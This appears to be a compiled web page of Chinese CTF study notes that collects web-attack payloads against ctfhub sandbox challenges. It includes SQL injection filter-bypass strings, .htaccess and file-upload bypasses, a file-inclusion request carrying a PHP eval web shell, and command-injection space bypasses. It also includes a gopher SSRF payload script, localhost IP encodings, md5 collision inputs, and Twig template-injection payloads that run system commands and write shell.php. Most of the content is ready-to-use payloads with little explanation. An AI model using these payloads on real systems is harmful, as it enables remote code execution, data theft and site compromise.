（<span class="token number">4</span>） 双关键字绕过（若删除掉第一个匹配的<span class="token keyword">union</span>就能绕过）：
id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">&#39;UNIunionONSeLselectECT1,2,3–-
(selselectect%20group_concat(table_name)%20frfromom%20infoorrmation_schema.tables%20where%20table_schema=&#39;</span>geek<span class="token string">&#39;)

&#39;</span><span class="token operator">%</span><span class="token number">20</span>uniunionon<span class="token operator">%</span><span class="token number">20</span>seleselectct<span class="token operator">%</span><span class="token number">201</span><span class="token punctuation">,</span><span class="token punctuation">(</span>seselectlect<span class="token operator">%</span><span class="token number">20</span>group_concat<span class="token punctuation">(</span>passwoorrd<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">20</span>frfromom<span class="token operator">%</span><span class="token number">20</span>b4bsql<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span>seleselectct<span class="token operator">%</span><span class="token number">20</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">20</span>frfromom<span class="token operator">%</span><span class="token number">20</span>infoorrmation_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token operator">%</span><span class="token number">20</span>whwhereere<span class="token operator">%</span><span class="token number">20</span>table_schema<span class="token operator">=</span><span class="token string">&quot;geek&quot;</span><span class="token punctuation">)</span>&#39;<span class="token comment">#</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>文件上传绕过</li></ul><ol><li>.htaccess 上传.htaccess文件至服务器上传目录，此时apache在解析该目录下的php时将按照文件要求。只要文件名匹配到所定义的字符串，就会将该文件当作php解析。</li></ol><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;FilesMatch &quot;shana&quot;&gt;
SetHandler application/x-httpd-php
&lt;/FilesMatch&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>或者</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>AddType application/x-httpd-php .png
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ol start="2"><li>文件MIME绕过 修改content-type</li><li>00截断 在url中使用%00截断，在post数据包中通过十六进制00截断</li><li>双写绕过 绕过过滤的常用手段，如过滤了php，可以写成p<code>php</code>hp</li><li>文件头检测绕过 绕过文件头检测的常用手段是使用图片木马，通过修改图片的文件头为php的文件头，从而绕过文件头检测。具体做法为上传一张图片，通过burp抓包，在末尾加上php代码并将文件名改成php，最后上传。</li></ol><ul><li>文件包含 include函数的作用：假如在index.php中include了一个文件，那么不管这个文件后缀是什么，这个文件中的内容将会直接出现在index.php中</li></ul><ol><li>本地文件包含</li></ol><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;file&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;file&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;flag&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">include</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;file&quot;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;Hacker!!!&quot;</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">&gt;</span></span>
i have a <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>shell.txt<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>shell<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>, how to use it ? i have a shell, how to use it ?
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,45),k={href:"http://challenge-261a320817fbcc6f.sandbox.ctfhub.com:10800/?file=shell.txt&ctfhub=system",target:"_blank",rel:"noopener noreferrer"},m=a(`<div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>GET /?file=php://input&amp;lee=system(&quot;cat%20../../../flag_6843&quot;); HTTP/1.1
Host: challenge-8714e12360439662.sandbox.ctfhub.com:10800
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 32

&lt;?php @eval($_REQUEST[&quot;lee&quot;]);?&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>命令注入 linux读取文件命令：cat、tac、more、less、head、tail、nl</li><li>linux空格绕过</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">cat</span> flag.txt
<span class="token punctuation">{</span>cat,flag.txt<span class="token punctuation">}</span>
<span class="token function">cat</span><span class="token variable">\${<span class="token environment constant">IFS</span>}</span>flag.txt
<span class="token function">cat</span><span class="token environment constant">$IFS</span><span class="token variable">$9flag</span>.txt
cat<span class="token operator">&lt;</span>flag.txt
cat<span class="token operator">&lt;&gt;</span>flag.txt
ca<span class="token punctuation">\\</span>t fl<span class="token punctuation">\\</span>ag
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>绕过运算符：绕过的方式有<code>%0a</code>、<code>%0d</code>、<code>%0D%0A</code> cat绕过：<code>ca&#39;&#39;t flag.txt</code><code>127.0.0.1%0acd\${IFS}*_is_here%0aca&#39;&#39;t\${IFS}*_5605156534453.php</code></p><ul><li>gopher</li></ul><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse
payload <span class="token operator">=</span>\\
<span class="token triple-quoted-string string">&quot;&quot;&quot;POST /flag.php HTTP/1.1
Host: 127.0.0.1:80
Content-Type: application/x-www-form-urlencoded
Content-Length: 36

key=528237161c99c6d262d7aacafd9e0067
&quot;&quot;&quot;</span>
<span class="token comment">#注意后面一定要有回车，回车结尾表示http请求结束</span>
tmp <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
new <span class="token operator">=</span> tmp<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">&#39;%0A&#39;</span><span class="token punctuation">,</span><span class="token string">&#39;%0D%0A&#39;</span><span class="token punctuation">)</span>
result <span class="token operator">=</span> <span class="token string">&#39;gopher://127.0.0.1:80/&#39;</span><span class="token operator">+</span><span class="token string">&#39;_&#39;</span><span class="token operator">+</span>new
result <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>result<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>       <span class="token comment"># 这里因为是GET请求所以要进行两次url编码，编码次数与请求次数有关</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>URL bypass</li></ul><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>?url=http://notfound.ctfhub.com@127.0.0.1/flag.php  // 相当于
?url=127.0.0.1/flag.php
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>数字IP bypass</li></ul><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>127.0.0.1:
八进制：0177.0.0.1
十六进制：0x7f.0.0.1
十进制：2130706433

http://localhost/
http://0/
http://[0:0:0:0:0:ffff:127.0.0.1]/
http://①②⑦.⓪.⓪.①
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>php一句话</li></ul><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&#39;</span>php<span class="token punctuation">&#39;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token function">eval</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">&#39;lee&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span> // 绕过@，<span class="token php language-php"><span class="token delimiter important">&lt;?</span>
</span></code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ul><li>文件上传</li></ul><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>.phtml、.php3、.php5绕过黑名单
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ul><li><p>php反序列化 绕过weakup：序列化数据中成员数据的个数大于实际的个数。protect和private的变量类名和变量名前均需要添加<code>%00</code></p></li><li><p>php中<code>==</code></p></li></ul><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token number">123</span><span class="token operator">==</span><span class="token string single-quoted-string">&#39;123asdfas&#39;</span> <span class="token comment">// true</span>
<span class="token number">123</span><span class="token operator">===</span><span class="token string single-quoted-string">&#39;123adsfsd&#39;</span> <span class="token comment">// false</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>php中大数字使用科学计数法</li></ul><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token number">100000000</span><span class="token operator">=</span><span class="token number">1e8</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ul><li>php中md5绕过</li></ul><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$gg</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$id</span> <span class="token operator">!==</span> <span class="token variable">$gg</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
使用参数污染绕过
http<span class="token punctuation">:</span><span class="token comment">//127.0.0.1/index.php?id[]=1&amp;gg[]=2</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>md5强绕过</li></ul><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2xxxxxxxxxx a=a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>twig常用的注入payload</li></ul><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>{{&#39;/etc/passwd&#39;|file_excerpt(1,30)}}
{{app.request.files.get(1).__construct(&#39;/etc/passwd&#39;,&#39;&#39;)}}
{{app.request.files.get(1).openFile.fread(99)}}
{{_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)}}
{{_self.env.getFilter(&quot;whoami&quot;)}}
{{_self.env.enableDebug()}}{{_self.env.isDebug()}}
{{[&quot;id&quot;]|map(&quot;system&quot;)|join(&quot;,&quot;)
{{{&quot;&lt;?php phpinfo();&quot;:&quot;/var/www/html/shell.php&quot;}|map(&quot;file_put_contents&quot;)}}
{{[&quot;id&quot;,0]|sort(&quot;system&quot;)|join(&quot;,&quot;)}}
{{[&quot;id&quot;]|filter(&quot;system&quot;)|join(&quot;,&quot;)}}
{{[0,0]|reduce(&quot;system&quot;,&quot;id&quot;)|join(&quot;,&quot;)}}
{{[&#39;cat /etc/passwd&#39;]|filter(&#39;system&#39;)}}

{{_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)}}{{_self.env.getFilter(&quot;cat /flag&quot;)}}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,24);function v(b,g){const e=c("ExternalLinkIcon");return o(),l("div",null,[u,s("p",null,[n("特殊字符网址："),s("a",r,[n("http://www.fhdq.net/"),t(e)])]),d,s("p",null,[n("payload："),s("a",k,[n("http://challenge-261a320817fbcc6f.sandbox.ctfhub.com:10800/?file=shell.txt&ctfhub=system"),t(e)]),n('("cat /flag"); 2. php://input读取post数据')]),m])}const f=p(i,[["render",v],["__file","零零散散的知识点.html.vue"]]);export{f as default};
